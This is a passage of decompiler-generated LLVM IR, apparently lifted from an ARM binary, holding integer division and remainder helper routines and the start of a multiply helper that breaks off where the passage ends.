define i32 @function_10328(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10328:
  store i32 %arg1, i32* @r0, align 4
  %v1_10328 = add i32 %arg2, -1
  %v2_10328 = icmp eq i32 %arg2, 0
  br i1 %v2_10328, label %dec_label_pc_103e4, label %dec_label_pc_10330

dec_label_pc_10330:                               ; preds = %dec_label_pc_10328
  %v7_10328 = icmp eq i32 %arg2, 1
  br i1 %v7_10328, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_10330
  %v1_10330 = load i32, i32* @r0, align 4
  %v10_10330 = icmp eq i32 %v1_10330, %arg2
  br i1 %v10_10330, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_10330, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_10330 = icmp ult i32 %v1_10330, %arg2
  br i1 %v4_10330, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_10338 = and i32 %v1_10328, %arg2
  %v8_10338 = icmp eq i32 %v6_10338, 0
  br i1 %v8_10338, label %.thread67, label %dec_label_pc_10348.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1033c = phi i32 [ %v1_10330, %bb75 ], [ 0, %.thread65 ]
  %v3_1033c = and i32 %v1_1033c, %v1_10328
  br label %bb76

dec_label_pc_10348.preheader:                     ; preds = %bb75
  %v2_1034899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1034899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_103d8, %bb74, %bb89, %bb84, %dec_label_pc_103a8, %.thread67
  %v5_10340 = phi i32 [ %v1_10330, %bb74 ], [ %v3_1033c, %.thread67 ], [ %v1_10384.v6_10384.v6_1038c.v6_10394, %dec_label_pc_103a8 ], [ 0, %bb84 ], [ %v1_103dc, %dec_label_pc_103d8 ], [ %v2_103d8, %bb89 ]
  ret i32 %v5_10340

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_10348.preheader
  %v0_1035c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_10348.preheader ], [ %v4_10350, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_10348.preheader ], [ %v2_1035411, %.thread1.thread9 ]
  br label %dec_label_pc_1035cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_10348.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1035411, %.thread1.thread9 ], [ 0, %dec_label_pc_10348.preheader ]
  %v0_1035c.pr33100 = phi i32 [ %v4_10350, %.thread1.thread9 ], [ %arg2, %dec_label_pc_10348.preheader ]
  %v4_1034c = icmp ult i32 %v0_1035c.pr33100, %v1_10330
  br i1 %v4_1034c, label %bb78, label %dec_label_pc_1035cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_10350 = and i32 %v0_1035c.pr33100, 268435456
  %v3_10350 = icmp eq i32 %v2_10350, 0
  %v4_10350 = mul i32 %v0_1035c.pr33100, 16
  br i1 %v3_10350, label %.thread1.thread9, label %dec_label_pc_1035c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1035411 = add i32 %storemerge101, 4
  %v2_10348 = icmp ugt i32 %v4_10350, 268435455
  br i1 %v2_10348, label %.thread, label %bb77

dec_label_pc_1035cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_1035cthread-pre-split.loopexit

dec_label_pc_1035cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1035cthread-pre-split.loopexit.loopexit, %.thread
  %v0_1035c.pr3398 = phi i32 [ %v0_1035c.pr33.lcssa, %.thread ], [ %v0_1035c.pr33100, %dec_label_pc_1035cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_1035cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1035cthread-pre-split

dec_label_pc_1035cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_1035cthread-pre-split.loopexit
  %v1_1036839 = phi i32 [ %storemerge95, %dec_label_pc_1035cthread-pre-split.loopexit ], [ %v2_10368, %.thread4 ]
  %v0_1035c.pr = phi i32 [ %v0_1035c.pr3398, %dec_label_pc_1035cthread-pre-split.loopexit ], [ %v3_10364, %.thread4 ]
  br label %dec_label_pc_1035c

dec_label_pc_1035c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_1035c

dec_label_pc_1035c:                               ; preds = %dec_label_pc_1035c.loopexit, %dec_label_pc_1035cthread-pre-split
  %v0_10370.pr = phi i32 [ %v1_1036839, %dec_label_pc_1035cthread-pre-split ], [ %storemerge101, %dec_label_pc_1035c.loopexit ]
  %v1_10364 = phi i32 [ %v0_1035c.pr, %dec_label_pc_1035cthread-pre-split ], [ %v4_10350, %dec_label_pc_1035c.loopexit ]
  %v2_1035c = icmp slt i32 %v1_10364, 0
  br i1 %v2_1035c, label %dec_label_pc_10370, label %bb79

bb79:                                             ; preds = %dec_label_pc_1035c
  %v4_10360 = icmp ult i32 %v1_10364, %v1_10330
  br i1 %v4_10360, label %.thread4, label %dec_label_pc_10370

.thread4:                                         ; preds = %bb79
  %v3_10364 = mul i32 %v1_10364, 2
  %v2_10368 = add i32 %v0_10370.pr, 1
  br label %dec_label_pc_1035cthread-pre-split

dec_label_pc_10370:                               ; preds = %bb79, %dec_label_pc_1035c
  %v2_10370 = add i32 %v0_10370.pr, -3
  %v5_10374 = icmp slt i32 %v0_10370.pr, 3
  br i1 %v5_10374, label %dec_label_pc_103b4, label %dec_label_pc_10378

dec_label_pc_10378:                               ; preds = %dec_label_pc_10370, %bb83
  %v6_103a0 = phi i32 [ %v0_103a8, %bb83 ], [ %v2_10370, %dec_label_pc_10370 ]
  %v1_1037c = phi i32 [ %v1_10384.v6_10384.v6_1038c.v6_10394, %bb83 ], [ %v1_10330, %dec_label_pc_10370 ]
  %v3_1039c12 = phi i32 [ %v3_1039c, %bb83 ], [ %v1_10364, %dec_label_pc_10370 ]
  %v3_10378 = icmp ult i32 %v1_1037c, %v3_1039c12
  %v3_1037c = select i1 %v3_10378, i32 0, i32 %v3_1039c12
  %v1_10384 = sub i32 %v1_1037c, %v3_1037c
  %v4_10380 = udiv i32 %v3_1039c12, 2
  %v6_10380 = icmp ult i32 %v1_10384, %v4_10380
  %v6_10384 = select i1 %v6_10380, i32 0, i32 %v4_10380
  %v1_10384.v6_10384 = sub i32 %v1_10384, %v6_10384
  %.demorgan = and i1 %v3_10378, %v6_10380
  %v4_10388 = udiv i32 %v3_1039c12, 4
  %v6_10388 = icmp ult i32 %v1_10384.v6_10384, %v4_10388
  %v6_1038c = select i1 %v6_10388, i32 0, i32 %v4_10388
  %v1_10384.v6_10384.v6_1038c = sub i32 %v1_10384.v6_10384, %v6_1038c
  %.demorgan71 = and i1 %.demorgan, %v6_10388
  %v4_10390 = udiv i32 %v3_1039c12, 8
  %v6_10390 = icmp ult i32 %v1_10384.v6_10384.v6_1038c, %v4_10390
  %v6_10394 = select i1 %v6_10390, i32 0, i32 %v4_10390
  %v1_10384.v6_10384.v6_1038c.v6_10394 = sub i32 %v1_10384.v6_10384.v6_1038c, %v6_10394
  %.demorgan72 = and i1 %.demorgan71, %v6_10390
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_10378
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_10378, %bb80
  %v2_10398 = add i32 %v1_10384.v6_10384.v6_1038c.v6_10394, -1
  %v4_10398 = sub i32 0, %v1_10384.v6_10384.v6_1038c.v6_10394
  %v5_10398 = and i32 %v1_10384.v6_10384.v6_1038c.v6_10394, %v4_10398
  %v3_1039c = udiv i32 %v3_1039c12, 16
  %v5_103a0 = icmp slt i32 %v1_10384.v6_10384.v6_1038c.v6_10394, 1
  br i1 %v5_103a0, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_103a0 = add i32 %v6_103a0, -4
  %v9_103a0 = sub i32 3, %v6_103a0
  %v10_103a0 = and i32 %v9_103a0, %v6_103a0
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_103a8 = phi i32 [ %v6_103a0, %bb81 ], [ %v7_103a0, %bb82 ]
  %v0_103a415.in = phi i32 [ %v2_10398, %bb81 ], [ %v7_103a0, %bb82 ]
  %v1_103a414.in = phi i32 [ %v5_10398, %bb81 ], [ %v10_103a0, %bb82 ]
  %v1_103a414 = icmp slt i32 %v1_103a414.in, 0
  %v0_103a415 = icmp slt i32 %v0_103a415.in, 0
  %v2_103a4 = xor i1 %v0_103a415, %v1_103a414
  br i1 %v2_103a4, label %dec_label_pc_103a8, label %dec_label_pc_10378

dec_label_pc_103a8:                               ; preds = %bb83
  %v1_103a8 = urem i32 %v0_103a8, 4
  %v2_103a8 = icmp eq i32 %v1_103a8, 0
  br i1 %v2_103a8, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_103a8
  %v3_103ac = icmp eq i32 %v1_10384.v6_10384.v6_1038c.v6_10394, 0
  br i1 %v3_103ac, label %bb76, label %dec_label_pc_103b4

dec_label_pc_103b4:                               ; preds = %bb84, %dec_label_pc_10370
  %v0_103c8 = phi i32 [ %v3_1039c, %bb84 ], [ %v1_10364, %dec_label_pc_10370 ]
  %v1_103c4 = phi i32 [ %v1_10384.v6_10384.v6_1038c.v6_10394, %bb84 ], [ %v1_10330, %dec_label_pc_10370 ]
  %v0_103b4 = phi i32 [ %v0_103a8, %bb84 ], [ %v2_10370, %dec_label_pc_10370 ]
  %v5_103b8 = icmp slt i32 %v0_103b4, -2
  br i1 %v5_103b8, label %dec_label_pc_103d8, label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_103b4
  %v8_103b4 = icmp eq i32 %v0_103b4, -2
  br i1 %v8_103b4, label %dec_label_pc_103cc, label %dec_label_pc_103c0

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103bc
  %v3_103c0 = icmp ult i32 %v1_103c4, %v0_103c8
  br i1 %v3_103c0, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_103c0
  %v2_103c0 = sub i32 %v1_103c4, %v0_103c8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_103c0, %bb85
  %v0_103cc52 = phi i32 [ %v1_103c4, %dec_label_pc_103c0 ], [ %v2_103c0, %bb85 ]
  %v3_103c8 = udiv i32 %v0_103c8, 2
  br label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103bc, %bb86
  %v0_103d4 = phi i32 [ %v0_103c8, %dec_label_pc_103bc ], [ %v3_103c8, %bb86 ]
  %v1_103d0 = phi i32 [ %v1_103c4, %dec_label_pc_103bc ], [ %v0_103cc52, %bb86 ]
  %v3_103cc = icmp ult i32 %v1_103d0, %v0_103d4
  br i1 %v3_103cc, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_103cc
  %v2_103cc = sub i32 %v1_103d0, %v0_103d4
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_103cc, %bb87
  %v0_103d855 = phi i32 [ %v1_103d0, %dec_label_pc_103cc ], [ %v2_103cc, %bb87 ]
  %v3_103d4 = udiv i32 %v0_103d4, 2
  br label %dec_label_pc_103d8

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103b4, %bb88
  %v2_103dc = phi i32 [ %v0_103c8, %dec_label_pc_103b4 ], [ %v3_103d4, %bb88 ]
  %v1_103dc = phi i32 [ %v1_103c4, %dec_label_pc_103b4 ], [ %v0_103d855, %bb88 ]
  %v3_103d8 = icmp ult i32 %v1_103dc, %v2_103dc
  br i1 %v3_103d8, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_103d8
  %v2_103d8 = sub i32 %v1_103dc, %v2_103dc
  br label %bb76

dec_label_pc_103e4:                               ; preds = %dec_label_pc_10328
  %v0_103e4 = load i32, i32* @lr, align 4
  %v0_103e8 = call i32 @function_104d8()
  call void @__pseudo_branch(i32 %v0_103e4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_103dc, { 1, 2, 0 }
  uselistorder i32 %v0_103c8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_103a8, { 1, 0, 2 }
  uselistorder i32 %v7_103a0, { 1, 0 }
  uselistorder i32 %v3_1039c, { 1, 0 }
  uselistorder i32 %v1_10384.v6_10384.v6_1038c.v6_10394, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_10390, { 1, 0 }
  uselistorder i32 %v4_10388, { 1, 0 }
  uselistorder i32 %v4_10380, { 1, 0 }
  uselistorder i32 %v6_103a0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_10370, { 1, 0 }
  uselistorder i32 %v1_10364, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_10350, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1035c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10330, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_103d8, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_103cc, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_10378, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_103f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_103f4:
  store i32 %arg1, i32* @r0, align 4
  %v2_103f4 = icmp eq i32 %arg2, 0
  br i1 %v2_103f4, label %dec_label_pc_104c8, label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103f4
  %v1_103f4 = icmp slt i32 %arg2, 0
  br i1 %v1_103f4, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_103fc
  %v2_103fc = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_103fc, %bb
  %v4_10414 = phi i32 [ %arg2, %dec_label_pc_103fc ], [ %v2_103fc, %bb ]
  %v0_10400 = load i32, i32* @r0, align 4
  %v1_10400 = icmp slt i32 %v0_10400, 0
  br i1 %v1_10400, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_10404 = sub i32 0, %v0_10400
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_1040c = phi i32 [ %v0_10400, %bb79 ], [ %v2_10404, %bb80 ]
  %v1_10408 = add i32 %v4_10414, -1
  %v7_10408 = icmp eq i32 %v4_10414, 1
  br i1 %v7_10408, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_1040c = icmp eq i32 %v1_1040c, %v4_10414
  br i1 %v10_1040c, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_1040c = icmp ult i32 %v1_1040c, %v4_10414
  br i1 %v4_1040c, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_10414 = and i32 %v1_10408, %v4_10414
  %v8_10414 = icmp eq i32 %v6_10414, 0
  br i1 %v8_10414, label %.thread72, label %dec_label_pc_10424.preheader

dec_label_pc_10424.preheader:                     ; preds = %bb84
  %v2_10424109 = icmp ugt i32 %v4_10414, 268435455
  br i1 %v2_10424109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1041864 = phi i32 [ %v1_1040c, %bb84 ], [ 0, %.thread70 ]
  %v3_10418 = and i32 %v1_1041864, %v1_10408
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_10424.preheader
  %v0_10438.pr35.lcssa = phi i32 [ %v4_10414, %dec_label_pc_10424.preheader ], [ %v4_1042c, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_10424.preheader ], [ %v2_104309, %.thread2.thread7 ]
  br label %dec_label_pc_10438thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_10424.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_104309, %.thread2.thread7 ], [ 0, %dec_label_pc_10424.preheader ]
  %v0_10438.pr35110 = phi i32 [ %v4_1042c, %.thread2.thread7 ], [ %v4_10414, %dec_label_pc_10424.preheader ]
  %v4_10428 = icmp ult i32 %v0_10438.pr35110, %v1_1040c
  br i1 %v4_10428, label %bb86, label %dec_label_pc_10438thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_1042c = and i32 %v0_10438.pr35110, 268435456
  %v3_1042c = icmp eq i32 %v2_1042c, 0
  %v4_1042c = mul i32 %v0_10438.pr35110, 16
  br i1 %v3_1042c, label %.thread2.thread7, label %dec_label_pc_10438.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_104309 = add i32 %storemerge111, 4
  %v2_10424 = icmp ugt i32 %v4_1042c, 268435455
  br i1 %v2_10424, label %.thread1, label %bb85

dec_label_pc_10438thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_10438thread-pre-split.loopexit

dec_label_pc_10438thread-pre-split.loopexit:      ; preds = %dec_label_pc_10438thread-pre-split.loopexit.loopexit, %.thread1
  %v0_10438.pr35108 = phi i32 [ %v0_10438.pr35.lcssa, %.thread1 ], [ %v0_10438.pr35110, %dec_label_pc_10438thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_10438thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10438thread-pre-split

dec_label_pc_10438thread-pre-split:               ; preds = %.thread4, %dec_label_pc_10438thread-pre-split.loopexit
  %v1_1044441 = phi i32 [ %storemerge105, %dec_label_pc_10438thread-pre-split.loopexit ], [ %v2_10444, %.thread4 ]
  %v2_1043c36 = phi i32 [ %v1_1040c, %dec_label_pc_10438thread-pre-split.loopexit ], [ %v2_1043c, %.thread4 ]
  %v0_10438.pr = phi i32 [ %v0_10438.pr35108, %dec_label_pc_10438thread-pre-split.loopexit ], [ %v3_10440, %.thread4 ]
  br label %dec_label_pc_10438

dec_label_pc_10438.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_10438

dec_label_pc_10438:                               ; preds = %dec_label_pc_10438.loopexit, %dec_label_pc_10438thread-pre-split
  %v0_1044c.pr = phi i32 [ %v1_1044441, %dec_label_pc_10438thread-pre-split ], [ %storemerge111, %dec_label_pc_10438.loopexit ]
  %v2_1043c = phi i32 [ %v2_1043c36, %dec_label_pc_10438thread-pre-split ], [ %v1_1040c, %dec_label_pc_10438.loopexit ]
  %v1_10440 = phi i32 [ %v0_10438.pr, %dec_label_pc_10438thread-pre-split ], [ %v4_1042c, %dec_label_pc_10438.loopexit ]
  %v2_10438 = icmp slt i32 %v1_10440, 0
  br i1 %v2_10438, label %dec_label_pc_1044c, label %bb87

bb87:                                             ; preds = %dec_label_pc_10438
  %v4_1043c = icmp ult i32 %v1_10440, %v2_1043c
  br i1 %v4_1043c, label %.thread4, label %dec_label_pc_1044c

.thread4:                                         ; preds = %bb87
  %v3_10440 = mul i32 %v1_10440, 2
  %v2_10444 = add i32 %v0_1044c.pr, 1
  br label %dec_label_pc_10438thread-pre-split

dec_label_pc_1044c:                               ; preds = %bb87, %dec_label_pc_10438
  %v2_1044c = add i32 %v0_1044c.pr, -3
  %v5_10450 = icmp slt i32 %v0_1044c.pr, 3
  br i1 %v5_10450, label %dec_label_pc_10490, label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_1044c, %bb91
  %v6_1047c = phi i32 [ %v0_10484, %bb91 ], [ %v2_1044c, %dec_label_pc_1044c ]
  %v1_10458 = phi i32 [ %v1_10460.v6_10460.v6_10468.v6_10470, %bb91 ], [ %v2_1043c, %dec_label_pc_1044c ]
  %v3_1047810 = phi i32 [ %v3_10478, %bb91 ], [ %v1_10440, %dec_label_pc_1044c ]
  %v3_10454 = icmp ult i32 %v1_10458, %v3_1047810
  %v3_10458 = select i1 %v3_10454, i32 0, i32 %v3_1047810
  %v1_10460 = sub i32 %v1_10458, %v3_10458
  %v4_1045c = udiv i32 %v3_1047810, 2
  %v6_1045c = icmp ult i32 %v1_10460, %v4_1045c
  %v6_10460 = select i1 %v6_1045c, i32 0, i32 %v4_1045c
  %v1_10460.v6_10460 = sub i32 %v1_10460, %v6_10460
  %.demorgan = and i1 %v3_10454, %v6_1045c
  %v4_10464 = udiv i32 %v3_1047810, 4
  %v6_10464 = icmp ult i32 %v1_10460.v6_10460, %v4_10464
  %v6_10468 = select i1 %v6_10464, i32 0, i32 %v4_10464
  %v1_10460.v6_10460.v6_10468 = sub i32 %v1_10460.v6_10460, %v6_10468
  %.demorgan76 = and i1 %.demorgan, %v6_10464
  %v4_1046c = udiv i32 %v3_1047810, 8
  %v6_1046c = icmp ult i32 %v1_10460.v6_10460.v6_10468, %v4_1046c
  %v6_10470 = select i1 %v6_1046c, i32 0, i32 %v4_1046c
  %v1_10460.v6_10460.v6_10468.v6_10470 = sub i32 %v1_10460.v6_10460.v6_10468, %v6_10470
  %.demorgan77 = and i1 %.demorgan76, %v6_1046c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_10454
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_10454, %bb88
  %v2_10474 = add i32 %v1_10460.v6_10460.v6_10468.v6_10470, -1
  %v4_10474 = sub i32 0, %v1_10460.v6_10460.v6_10468.v6_10470
  %v5_10474 = and i32 %v1_10460.v6_10460.v6_10468.v6_10470, %v4_10474
  %v3_10478 = udiv i32 %v3_1047810, 16
  %v5_1047c = icmp slt i32 %v1_10460.v6_10460.v6_10468.v6_10470, 1
  br i1 %v5_1047c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_1047c = add i32 %v6_1047c, -4
  %v9_1047c = sub i32 3, %v6_1047c
  %v10_1047c = and i32 %v9_1047c, %v6_1047c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_10484 = phi i32 [ %v6_1047c, %bb89 ], [ %v7_1047c, %bb90 ]
  %v0_1048013.in = phi i32 [ %v2_10474, %bb89 ], [ %v7_1047c, %bb90 ]
  %v1_1048012.in = phi i32 [ %v5_10474, %bb89 ], [ %v10_1047c, %bb90 ]
  %v1_1048012 = icmp slt i32 %v1_1048012.in, 0
  %v0_1048013 = icmp slt i32 %v0_1048013.in, 0
  %v2_10480 = xor i1 %v0_1048013, %v1_1048012
  br i1 %v2_10480, label %dec_label_pc_10484, label %dec_label_pc_10454

dec_label_pc_10484:                               ; preds = %bb91
  %v1_10484 = urem i32 %v0_10484, 4
  %v2_10484 = icmp eq i32 %v1_10484, 0
  br i1 %v2_10484, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_10484
  %v3_10488 = icmp eq i32 %v1_10460.v6_10460.v6_10468.v6_10470, 0
  br i1 %v3_10488, label %.thread6, label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %bb92, %dec_label_pc_1044c
  %v0_104a4 = phi i32 [ %v3_10478, %bb92 ], [ %v1_10440, %dec_label_pc_1044c ]
  %v1_104a0 = phi i32 [ %v1_10460.v6_10460.v6_10468.v6_10470, %bb92 ], [ %v2_1043c, %dec_label_pc_1044c ]
  %v0_10490 = phi i32 [ %v0_10484, %bb92 ], [ %v2_1044c, %dec_label_pc_1044c ]
  %v5_10494 = icmp slt i32 %v0_10490, -2
  br i1 %v5_10494, label %dec_label_pc_104b4, label %dec_label_pc_10498

dec_label_pc_10498:                               ; preds = %dec_label_pc_10490
  %v8_10490 = icmp eq i32 %v0_10490, -2
  br i1 %v8_10490, label %dec_label_pc_104a8, label %dec_label_pc_1049c

dec_label_pc_1049c:                               ; preds = %dec_label_pc_10498
  %v3_1049c = icmp ult i32 %v1_104a0, %v0_104a4
  br i1 %v3_1049c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_1049c
  %v2_1049c = sub i32 %v1_104a0, %v0_104a4
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_1049c, %bb93
  %v0_104a854 = phi i32 [ %v1_104a0, %dec_label_pc_1049c ], [ %v2_1049c, %bb93 ]
  %v3_104a4 = udiv i32 %v0_104a4, 2
  br label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %dec_label_pc_10498, %bb94
  %v0_104b0 = phi i32 [ %v0_104a4, %dec_label_pc_10498 ], [ %v3_104a4, %bb94 ]
  %v1_104ac = phi i32 [ %v1_104a0, %dec_label_pc_10498 ], [ %v0_104a854, %bb94 ]
  %v3_104a8 = icmp ult i32 %v1_104ac, %v0_104b0
  br i1 %v3_104a8, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_104a8
  %v2_104a8 = sub i32 %v1_104ac, %v0_104b0
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_104a8, %bb95
  %v0_104b457 = phi i32 [ %v1_104ac, %dec_label_pc_104a8 ], [ %v2_104a8, %bb95 ]
  %v3_104b0 = udiv i32 %v0_104b0, 2
  br label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_10490, %bb96
  %v2_104b8 = phi i32 [ %v0_104a4, %dec_label_pc_10490 ], [ %v3_104b0, %bb96 ]
  %v1_104b8 = phi i32 [ %v1_104a0, %dec_label_pc_10490 ], [ %v0_104b457, %bb96 ]
  %v3_104b4 = icmp ult i32 %v1_104b8, %v2_104b8
  br i1 %v3_104b4, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_104b4
  %v2_104b4 = sub i32 %v1_104b8, %v2_104b8
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_104b4, %bb83, %.thread72, %dec_label_pc_10484, %bb92, %bb97
  %v1_104c0 = phi i32 [ %v1_10460.v6_10460.v6_10468.v6_10470, %dec_label_pc_10484 ], [ 0, %bb92 ], [ %v1_104b8, %dec_label_pc_104b4 ], [ %v2_104b4, %bb97 ], [ %v3_10418, %.thread72 ], [ %v1_1040c, %bb83 ]
  br i1 %v1_10400, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_104c0 = sub i32 0, %v1_104c0
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_104c4 = phi i32 [ %v1_104c0, %.thread6 ], [ %v2_104c0, %bb98 ]
  ret i32 %v1_104c4

dec_label_pc_104c8:                               ; preds = %dec_label_pc_103f4
  %v0_104c8 = load i32, i32* @lr, align 4
  %v0_104cc = call i32 @function_104d8()
  call void @__pseudo_branch(i32 %v0_104c8)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_104a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10484, { 1, 0, 2 }
  uselistorder i32 %v7_1047c, { 1, 0 }
  uselistorder i32 %v3_10478, { 1, 0 }
  uselistorder i32 %v1_10460.v6_10460.v6_10468.v6_10470, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_1046c, { 1, 0 }
  uselistorder i32 %v4_10464, { 1, 0 }
  uselistorder i32 %v4_1045c, { 1, 0 }
  uselistorder i32 %v6_1047c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1044c, { 1, 0 }
  uselistorder i32 %v1_10440, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1043c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_1042c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10438.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1040c, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_10414, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_104b4, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_104a8, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_10454, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_104d8() local_unnamed_addr {
dec_label_pc_104d8:
  %v1_104d8 = load i32, i32* @r0, align 4
  ret i32 %v1_104d8
}

define i32 @function_104dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12) local_unnamed_addr {
dec_label_pc_104dc:
  %v3_104e8 = udiv i32 %arg1, 65536
  %v3_104ec = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_104e8, -65536
  %v5_104f0 = add i32 %tmp, -1
  %v6_104f0 = and i32 %v5_104f0, %arg1
  %tmp10 = mul i32 %v3_104ec, -65536
  %v5_104f4 = add i32 %tmp10, -1
  %v6_104f4 = and i32 %v5_104f4, %arg3
  %v2_104f8 = mul i32 %v6_104f4, %v6_104f0
  %v2_104fc = mul i32 %v6_104f4, %v3_104e8
  %v2_10500 = mul i32 %v6_104f0, %v3_104ec
  %v2_10508 = add i32 %v2_104fc, %v2_10500
  %v3_10508 = icmp ult i32 %v2_10508, %v2_104fc
  br i1 %v3_10508, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_104dc
  br label %bb9

